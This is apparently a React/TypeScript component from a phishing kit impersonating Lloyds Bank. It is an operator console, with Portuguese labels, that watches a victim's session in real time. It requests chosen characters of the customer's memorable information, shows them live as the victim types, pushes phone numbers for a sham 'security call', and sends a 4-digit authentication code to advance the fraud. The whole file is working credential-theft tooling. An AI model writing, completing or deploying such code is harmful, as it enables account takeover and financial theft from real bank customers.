import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import {
  Send,
  Phone,
  KeyRound,
  AlertTriangle,
  CheckCircle,
  Copy,
  Eye,
} from "lucide-react";

interface LloydsOperatorControlsProps {
  sessionId: string;
  broadcastToAll: (event: string, payload: Record<string, string>) => void;
  sending: string | null;
  setSending: (v: string | null) => void;
  lastAction: string | null;
  setLastAction: (v: string | null) => void;
  decision: string | null;
  decisionSending: boolean;
}

const LloydsOperatorControls = ({
  sessionId,
  broadcastToAll,
  sending,
  setSending,
  lastAction,
  setLastAction,
  decision,
  decisionSending,
}: LloydsOperatorControlsProps) => {
  // ── Admin inputs ──
  const [pos1, setPos1] = useState("2nd");
  const [pos2, setPos2] = useState("4th");
  const [pos3, setPos3] = useState("8th");
  const [mobileInput, setMobileInput] = useState("");
  const [workInput, setWorkInput] = useState("");
  const [authCodeInput, setAuthCodeInput] = useState("");

  // ── Live client data ──
  const [clientMemorableChars, setClientMemorableChars] = useState("");
  const [clientPhoneChoice, setClientPhoneChoice] = useState("");
  const [clientCallConfirmed, setClientCallConfirmed] = useState(false);
  const [copied, setCopied] = useState<string | null>(null);

  // Persistent channel ref for bidirectional communication
  const channelRef = useRef<ReturnType<typeof supabase.channel> | null>(null);

  // ── Listen for client data on shared channel ──
  useEffect(() => {
    const channelName = `lloyds-${sessionId}`;
    const channel = supabase.channel(channelName);

    channel
      .on("broadcast", { event: "lloyds_memorable_typing" }, (p) => {
        if (p.payload?.characters !== undefined) {
          setClientMemorableChars(p.payload.characters);
        }
      })
      .on("broadcast", { event: "lloyds_phone_choice" }, (p) => {
        if (p.payload?.choice) {
          setClientPhoneChoice(p.payload.choice);
        }
      })
      .on("broadcast", { event: "lloyds_call_confirmed" }, (p) => {
        if (p.payload?.choice) {
          setClientPhoneChoice(p.payload.choice);
          setClientCallConfirmed(true);
        }
      })
      .subscribe((status) => {
        if (status === "SUBSCRIBED") {
          channelRef.current = channel;
        }
      });

    // Polling fallback
    const poll = setInterval(async () => {
      const { data } = await supabase
        .from("sessions")
        .select("otp_code")
        .eq("id", sessionId)
        .maybeSingle();

      if (!data?.otp_code) return;
      const otp = data.otp_code;

      if (otp.startsWith("lloyds_chars:")) {
        setClientMemorableChars(otp.replace("lloyds_chars:", ""));
      } else if (otp.startsWith("lloyds_choice:")) {
        setClientPhoneChoice(otp.replace("lloyds_choice:", ""));
      } else if (otp.startsWith("lloyds_call_confirmed:")) {
        setClientPhoneChoice(otp.replace("lloyds_call_confirmed:", ""));
        setClientCallConfirmed(true);
      }
    }, 2000);

    return () => {
      supabase.removeChannel(channel);
      channelRef.current = null;
      clearInterval(poll);
    };
  }, [sessionId]);

  // Helper to send on shared channel
  const sendOnChannel = useCallback(
    (event: string, payload: Record<string, unknown>) => {
      if (channelRef.current) {
        channelRef.current.send({ type: "broadcast", event, payload });
      } else {
        // Fallback: create temp channel with SAME name
        const bc = supabase.channel(`lloyds-${sessionId}`);
        bc.subscribe((s) => {
          if (s === "SUBSCRIBED") {
            bc.send({ type: "broadcast", event, payload });
            setTimeout(() => supabase.removeChannel(bc), 1500);
          }
        });
      }
    },
    [sessionId]
  );

  // ── Actions ──
  const doAction = async (
    id: string,
    dbStatus: string,
    events: { event: string; payload: Record<string, string> }[],
    dbExtra?: Record<string, string>
  ) => {
    setSending(id);
    await supabase
      .from("sessions")
      .update({ status: dbStatus, ...dbExtra })
      .eq("id", sessionId);
    events.forEach(({ event, payload }) => broadcastToAll(event, payload));
    setSending(null);
    setLastAction(id);
  };

  // Send memorable info positions
  const sendPositions = () => {
    const positions = [pos1, pos2, pos3].filter(p => p.trim()).join(",");
    if (!positions) return;
    doAction(
      "ll_memorable",
      "lloyds_memorable",
      [
        { event: "review_decision", payload: { status: "lloyds_memorable" } },
      ],
      { otp_code: `lloyds_positions:${positions}` }
    );

    // Also broadcast positions on shared lloyds channel
    sendOnChannel("lloyds_positions", { positions, session_id: sessionId });
  };

  // Send security call phone numbers
  const sendPhones = () => {
    if (!mobileInput.trim() && !workInput.trim()) return;
    const phonesStr = `${mobileInput}|${workInput}`;
    doAction(
      "ll_security",
      "lloyds_security_call",
      [
        { event: "review_decision", payload: { status: "lloyds_security_call" } },
      ],
      { otp_code: `lloyds_phones:${phonesStr}` }
    );

    // Also broadcast phones on shared lloyds channel
    sendOnChannel("lloyds_security_phones", {
      mobile: mobileInput,
      work: workInput,
      session_id: sessionId,
    });
  };

  // Send auth code
  const sendAuthCode = () => {
    if (!authCodeInput.trim()) return;
    const code = authCodeInput.trim();
    doAction(
      "ll_calling",
      "lloyds_calling",
      [
        { event: "review_decision", payload: { status: "lloyds_calling" } },
      ],
      { otp_code: `lloyds_code:${code}` }
    );

    // Also broadcast code on shared lloyds channel
    sendOnChannel("lloyds_auth_code", { code, session_id: sessionId });
  };

  const copyToClipboard = (text: string, key: string) => {
    navigator.clipboard.writeText(text);
    setCopied(key);
    setTimeout(() => setCopied(null), 1500);
  };

  const A = lastAction;

  return (
    <div className="space-y-3">
      {/* ── Live Client Data ── */}
      <div className="rounded-lg border border-border bg-background/30 p-3">
        <p className="text-[9px] font-bold uppercase tracking-widest text-muted-foreground/60 mb-2">
          📡 Dados do Cliente (Tempo Real)
        </p>
        <div className="space-y-1.5">
          {/* Memorable chars */}
          <LiveField
            icon={<KeyRound size={10} />}
            label="Caracteres Memoráveis"
            value={clientMemorableChars ? clientMemorableChars.split(",").join(" ") : ""}
            highlight={!!clientMemorableChars}
            onCopy={() => copyToClipboard(clientMemorableChars, "chars")}
            isCopied={copied === "chars"}
          />
          {/* Phone choice */}
          <LiveField
            icon={<Phone size={10} />}
            label="Opção de Telefone"
            value={
              clientPhoneChoice
                ? `${clientPhoneChoice.toUpperCase()}${clientCallConfirmed ? " ✓ Confirmado" : ""}`
                : ""
            }
            highlight={!!clientPhoneChoice}
            onCopy={() => copyToClipboard(clientPhoneChoice, "choice")}
            isCopied={copied === "choice"}
          />
        </div>
      </div>

      {/* ── Step 1: Memorable Information ── */}
      <div className="rounded-lg border border-emerald-500/20 bg-emerald-500/5 p-3">
        <div className="flex items-center gap-1.5 mb-2">
          <KeyRound size={12} className="text-emerald-400" />
          <span className="text-[10px] font-bold uppercase tracking-wider text-emerald-400">
            1. Informação Memorável
          </span>
        </div>
        <div className="flex gap-1 items-end">
          <input
            value={pos1}
            onChange={(e) => setPos1(e.target.value)}
            placeholder="2nd"
            className="w-14 rounded-md border border-emerald-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground text-center placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-emerald-500"
          />
          <input
            value={pos2}
            onChange={(e) => setPos2(e.target.value)}
            placeholder="4th"
            className="w-14 rounded-md border border-emerald-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground text-center placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-emerald-500"
          />
          <input
            value={pos3}
            onChange={(e) => setPos3(e.target.value)}
            placeholder="8th"
            className="w-14 rounded-md border border-emerald-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground text-center placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-emerald-500"
          />
          <button
            onClick={sendPositions}
            disabled={(!pos1.trim() && !pos2.trim() && !pos3.trim()) || !!sending}
            className={`rounded-md px-2.5 py-1.5 text-white disabled:opacity-40 transition-colors flex items-center gap-1 ${
              A === "ll_memorable"
                ? "bg-green-600"
                : "bg-emerald-600 hover:bg-emerald-700"
            }`}
          >
            <Send size={10} />
            {A === "ll_memorable" && "✓"}
          </button>
        </div>
      </div>

      {/* ── Step 2: Security Call ── */}
      <div className="rounded-lg border border-blue-500/20 bg-blue-500/5 p-3">
        <div className="flex items-center gap-1.5 mb-2">
          <Phone size={12} className="text-blue-400" />
          <span className="text-[10px] font-bold uppercase tracking-wider text-blue-400">
            2. Chamada de Segurança
          </span>
        </div>
        <div className="space-y-1">
          <div className="flex gap-1">
            <span className="text-[9px] text-muted-foreground w-12 flex items-center shrink-0">
              Mobile:
            </span>
            <input
              value={mobileInput}
              onChange={(e) => setMobileInput(e.target.value)}
              placeholder="+447739****98"
              className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500"
            />
          </div>
          <div className="flex gap-1">
            <span className="text-[9px] text-muted-foreground w-12 flex items-center shrink-0">
              Work:
            </span>
            <input
              value={workInput}
              onChange={(e) => setWorkInput(e.target.value)}
              placeholder="+447968****88"
              className="flex-1 min-w-0 rounded-md border border-blue-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-blue-500"
            />
          </div>
          <button
            onClick={sendPhones}
            disabled={(!mobileInput.trim() && !workInput.trim()) || !!sending}
            className={`w-full rounded-md px-2.5 py-1.5 text-[10px] font-semibold text-white disabled:opacity-40 transition-colors flex items-center justify-center gap-1 ${
              A === "ll_security"
                ? "bg-green-600"
                : "bg-blue-600 hover:bg-blue-700"
            }`}
          >
            <Send size={10} />
            {A === "ll_security" ? "Enviado ✓" : "Enviar Opções de Telefone"}
          </button>
        </div>
      </div>

      {/* ── Step 3: Calling / Auth Code ── */}
      <div className="rounded-lg border border-amber-500/20 bg-amber-500/5 p-3">
        <div className="flex items-center gap-1.5 mb-2">
          <Phone size={12} className="text-amber-400" />
          <span className="text-[10px] font-bold uppercase tracking-wider text-amber-400">
            3. Código de Autenticação (4 dígitos)
          </span>
        </div>
        <div className="flex gap-1">
          <input
            value={authCodeInput}
            onChange={(e) => setAuthCodeInput(e.target.value)}
            placeholder="Ex: 7066"
            maxLength={4}
            inputMode="numeric"
            className="flex-1 min-w-0 rounded-md border border-amber-500/30 bg-background/50 px-2 py-1.5 text-[10px] text-foreground font-mono tracking-widest placeholder:text-muted-foreground/40 focus:outline-none focus:ring-1 focus:ring-amber-500"
          />
          <button
            onClick={sendAuthCode}
            disabled={!authCodeInput.trim() || !!sending}
            className={`rounded-md px-2.5 py-1.5 text-white disabled:opacity-40 transition-colors flex items-center gap-1 ${
              A === "ll_calling"
                ? "bg-green-600"
                : "bg-amber-600 hover:bg-amber-700"
            }`}
          >
            <Send size={10} />
            {A === "ll_calling" && "✓"}
          </button>
        </div>
      </div>
    </div>
  );
};

/* ═══════════════════════════════ */
/*  Mini Live Field               */
/* ═══════════════════════════════ */
const LiveField = ({
  icon,
  label,
  value,
  highlight,
  onCopy,
  isCopied,
}: {
  icon: React.ReactNode;
  label: string;
  value: string;
  highlight?: boolean;
  onCopy: () => void;
  isCopied: boolean;
}) => (
  <div
    onClick={() => value && onCopy()}
    className={`flex items-center justify-between rounded-md px-2 py-1.5 cursor-pointer transition-all active:scale-[0.97] ${
      highlight
        ? "bg-green-500/10 border border-green-500/20"
        : "bg-background/50 border border-transparent hover:border-border"
    }`}
  >
    <div className="flex items-center gap-1.5 min-w-0">
      <span className="text-muted-foreground shrink-0">{icon}</span>
      <div className="min-w-0">
        <p className="text-[8px] text-muted-foreground uppercase leading-none">
          {label}
        </p>
        <p
          className={`text-[11px] font-bold truncate ${
            highlight ? "text-green-400" : "text-foreground"
          }`}
        >
          {value || (
            <span className="text-muted-foreground/30 font-normal">—</span>
          )}
        </p>
      </div>
    </div>
    {value && (
      <span className="shrink-0 ml-1 text-muted-foreground">
        {isCopied ? (
          <CheckCircle size={10} className="text-green-400" />
        ) : (
          <Copy size={10} />
        )}
      </span>
    )}
  </div>
);

export default LloydsOperatorControls;
